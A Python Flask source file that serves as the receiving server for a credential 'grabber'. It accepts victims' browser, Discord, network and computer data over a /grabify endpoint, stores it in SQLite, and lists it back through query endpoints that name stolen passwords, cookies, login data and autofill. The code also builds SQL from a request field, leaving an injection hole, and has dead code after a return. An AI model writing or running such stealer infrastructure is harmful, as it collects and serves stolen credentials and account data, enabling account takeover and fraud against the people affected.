import json
import pip
import os

try:
    from flask import Flask, request, abort
    from flask_cors import CORS, cross_origin
except:
    pip.main(['install', 'flask'])
    pip.main(['install', 'flask_cors'])
    from flask import Flask, request, abort
    from flask_cors import CORS, cross_origin

try:
    import sqlite3
except:
    pip.main(['install', 'sqlite3'])
    import sqlite3

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "http://localhost:5173"}})

# Allow all origins to access the API.


@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    return response


@app.route("/grabify", methods=["POST"])
def webhook():
    if request.method == "POST":
        data = request.json

        dataType = data["type"]  # information, complete
        # Example requests:
        # {"type": "information", "data_type": "browser" "user": "LUKAS", "data": {"ip": "helloworld", "cpu": "yessir"}}

        if (dataType == "information"):
            user = data["user"]  # LUKAS
            # {"ip": "helloworld", "cpu": "yessir"}
            data_information = data["data"]

            try:
                add_to_db(user, data_information, data["dataType"] + "_data")
                return "OK"
            except Exception as e:
                print(e)
                abort(404)

        elif dataType == "complete":
            print("GRABBER :: " + data["user"] + " :: COMPLETE")
            return "OK"

        return "OK"
    else:
        abort(404)


@app.route("/get/<user>", methods=["GET"])
def get(user):
    try:
        if not os.path.exists("grabber.db"):
            generate_db()
        if request.method == "GET":
            conn = sqlite3.connect("grabber.db")
            c = conn.cursor()

            data = c.execute(
                "SELECT * FROM grabber WHERE user=?", (user,)).fetchone()

            if data is None:
                return "User not found."

            conn.commit()
            conn.close()

            return str(data)
        else:
            abort(404)
    except Exception as e:
        print(e)
        abort(404)


@app.route("/getall", methods=["GET"])
def getall():
    try:
        if not os.path.exists("grabber.db"):
            generate_db()
        if request.method == "GET":
            conn = sqlite3.connect("grabber.db")
            c = conn.cursor()

            data = c.execute("SELECT * FROM grabber").fetchall()

            if data is None:
                return "User not found."

            conn.commit()
            conn.close()

            return str(data)
        else:
            abort(404)
    except Exception as e:
        print(e)
        abort(404)


@app.route("/get/<user>/browser", methods=["GET"])
def getall_user_type(user):
    try:
        if not os.path.exists("grabber.db"):
            generate_db()
        if request.method == "GET":
            conn = sqlite3.connect("grabber.db")
            c = conn.cursor()

            data = c.execute(
                "SELECT browser_data FROM grabber WHERE user=?", (user,)).fetchone()
            if data is None:
                return "User not found."

            # Remove extra characters, such as extra quotes and array brackets
            # return json.dumps(data[0]).replace("null", "None")
            decodedJson = json.dumps(data[0])

            parsed_data = json.loads(decodedJson).get("chrome")
            return parsed_data

            return json.loads(json.dumps(parsed_data)).get("chrome")

            browsers = ["chrome", "firefox", "opera", "edge", "brave"]
            types = ["Autofill", "History", "Passwords",
                     "Bookmarks", "Cookies", "LoginData"]

            newData = []

            for browser in browsers:
                browser_data = parsed_data.get(browser)
                print(browser_data)
                data = {}
                newData.append({
                    "browser": browser,
                    "data": data
                })

                for type in types:
                    browser_data = browser_data.get(type).get("results")
                    # This is a list of the results. Load it as json, then count the amount of results.
                    try:
                        browser_data = json.loads(browser_data)
                    except json.JSONDecodeError:
                        return "Invalid JSON data in the database"

                    data[type] = len(browser_data)

            return newData
        else:
            abort(401)
    except Exception as e:
        print(e)
        abort(401)


@app.route("/getall/users", methods=["GET"])
# Only return the usersnames, not the actual data.
def getall_users():
    try:
        if not os.path.exists("grabber.db"):
            generate_db()
        if request.method == "GET":
            conn = sqlite3.connect("grabber.db")
            c = conn.cursor()

            data = c.execute("SELECT id, user FROM grabber").fetchall()

            if data is None:
                return "Users not found."

            conn.commit()
            conn.close()

            # Data is [[1,"LUKAS"]]
            # We want to return [{
            #  "id": 1,
            #   "name": "LUKAS"}]

            return [{"id": x[0], "name": x[1]} for x in data]

        else:
            abort(404)
    except Exception as e:
        print(e)
        abort(404)


def generate_db():
    conn = sqlite3.connect("grabber.db")
    c = conn.cursor()

    c.execute("""CREATE TABLE grabber (
        id integer PRIMARY KEY,
        user text,
        browser_data text,
        discord_data text,
        network_data text,
        computer_data text,
        custom_data text
    )""")

    conn.commit()
    conn.close()


def add_to_db(user, data, type):
    if not os.path.exists("grabber.db"):
        generate_db()

    conn = sqlite3.connect("grabber.db")
    c = conn.cursor()

    # Check if the user exists, then just add it to the table or if that column as well exists, then just replace the column thingy.
    if c.execute("SELECT * FROM grabber WHERE user=?", (user,)).fetchone() is not None:
        c.execute("UPDATE grabber SET " + type +
                  "=? WHERE user=?", (data, user))

    else:
        c.execute("INSERT INTO grabber (user, " +
                  type + ") VALUES (?, ?)", (user, data))

    conn.commit()
    conn.close()
